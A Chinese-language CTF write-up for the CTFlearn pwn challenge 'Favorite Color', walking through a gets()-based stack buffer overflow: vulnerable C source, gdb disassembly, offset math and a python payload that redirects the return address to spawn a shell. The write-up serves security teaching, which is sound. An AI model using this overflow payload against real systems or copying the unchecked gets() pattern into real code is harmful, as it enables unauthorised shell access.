---
layout: post
title: Favorite Color
categories: writeups
tags: pwn
ctfsite: ctflearn.com
challenge_url: https://ctflearn.com/problems/391
challenge_url_comment: 需要注册登录
---

这是一道简单的溢出题。使用题目给出的地址端口和用户名密码，登录到远程服务器中。查看一下目录内容：

![dir]({% asset dir.png %})

`flag.txt` 就在当前目录，但是没有权限读。目录里还提供了源码和 `Makefile`，以及可执行文件 `color`。看来目的就是通过 `color` 的漏洞来读取 `flag.txt` 了。

{% include writeup_begin.html %}

打开看一下 `color.c`：

```{  .c .numberLines }
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vuln() {
    char buf[32];

    printf("Enter your favorite color: ");
    gets(buf);

    int good = 0;
    for (int i = 0; buf[i]; i++) {
        good &= buf[i] ^ buf[i];
    }

    return good;
}

int main(char argc, char** argv) {
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());

    //disable buffering.
    setbuf(stdout, NULL);

    if (vuln()) {
        puts("Me too! That's my favorite color too!");
        puts("You get a shell! Flag is in flag.txt");
        system("/bin/sh");
    } else {
        puts("Boo... I hate that color! :(");
    }
}
```

这是一个典型的缓冲区溢出问题。正常情况下，`vuln` 将始终返回 0，导致 `main` 函数始终都执行 `else` 分支。我们的目标是能够执行 `if` 分支。

再看一下 `Makefile`:

```{ .makefile .numberLines }
        # 省略部分内容 ...
$(prob).o: $(prob).c
        cc -c -m32 -fno-stack-protector $(prob).c
```

使用 `-fno-stack-protector` 关闭了栈溢出保护。因此我们可以直接通过覆盖返回地址进行爆破。使用 gdb 反汇编一下 `vuln` 函数：

```{ .asm .numberLines }
   0x0804858b <+0>:     push   %ebp
   0x0804858c <+1>:     mov    %esp,%ebp
   0x0804858e <+3>:     sub    $0x38,%esp
   0x08048591 <+6>:     sub    $0xc,%esp
   0x08048594 <+9>:     push   $0x8048730
   0x08048599 <+14>:    call   0x8048410 <printf@plt>
   0x0804859e <+19>:    add    $0x10,%esp
   0x080485a1 <+22>:    sub    $0xc,%esp
   0x080485a4 <+25>:    lea    -0x30(%ebp),%eax
   0x080485a7 <+28>:    push   %eax
   0x080485a8 <+29>:    call   0x8048420 <gets@plt>
   0x080485ad <+34>:    add    $0x10,%esp
   0x080485b0 <+37>:    movl   $0x0,-0xc(%ebp)
   0x080485b7 <+44>:    movl   $0x0,-0x10(%ebp)
   0x080485be <+51>:    jmp    0x80485cb <vuln+64>
   0x080485c0 <+53>:    movl   $0x0,-0xc(%ebp)
   0x080485c7 <+60>:    addl   $0x1,-0x10(%ebp)
   0x080485cb <+64>:    lea    -0x30(%ebp),%edx
   0x080485ce <+67>:    mov    -0x10(%ebp),%eax
   0x080485d1 <+70>:    add    %edx,%eax
   0x080485d3 <+72>:    movzbl (%eax),%eax
   0x080485d6 <+75>:    test   %al,%al
   0x080485d8 <+77>:    jne    0x80485c0 <vuln+53>
   0x080485da <+79>:    mov    -0xc(%ebp),%eax
   0x080485dd <+82>:    leave
   0x080485de <+83>:    ret
```

第 9 行可以看到，缓冲区大小为 0x30 即 48 个字节（虽然代码中的数组大小为 32 个字节）。所以我们需要 48 个字节把缓冲区填满，再加 4 个字节覆盖 `ebp`，再 4 个字节覆盖返回地址。返回地址就填进 `if` 分支的开始处，用 gdb 查看一下 `main`：

```{ .asm .numberLines }
                        ......
   0x0804864e <+111>:   call   0x804858b <vuln>
   0x08048653 <+116>:   test   %eax,%eax
   0x08048655 <+118>:   je     0x8048689 <main+170>
   0x08048657 <+120>:   sub    $0xc,%esp
   0x0804865a <+123>:   push   $0x804874c
   0x0804865f <+128>:   call   0x8048440 <puts@plt>
   0x08048664 <+133>:   add    $0x10,%esp
   0x08048667 <+136>:   sub    $0xc,%esp
   0x0804866a <+139>:   push   $0x8048774
   0x0804866f <+144>:   call   0x8048440 <puts@plt>
   0x08048674 <+149>:   add    $0x10,%esp
   0x08048677 <+152>:   sub    $0xc,%esp
   0x0804867a <+155>:   push   $0x8048799
   0x0804867f <+160>:   call   0x8048450 <system@plt>
   0x08048684 <+165>:   add    $0x10,%esp
                        ......
```

`0x08048657` 就是我们希望的返回地址。因此构造 payload 并传入 `color` 程序:

```bash
(python -c "print '1234567890123456789012345678901234567890123456780000\x57\x86\x04\x08'";cat) | ./color
```

至此我们就得到了 shell：

![shell]({% asset shell.jpg %})

`cat` 一下，就可以得到 flag 了。

{% related_note stack-buffer-overflow-101 %}

{% include writeup_end.html %}
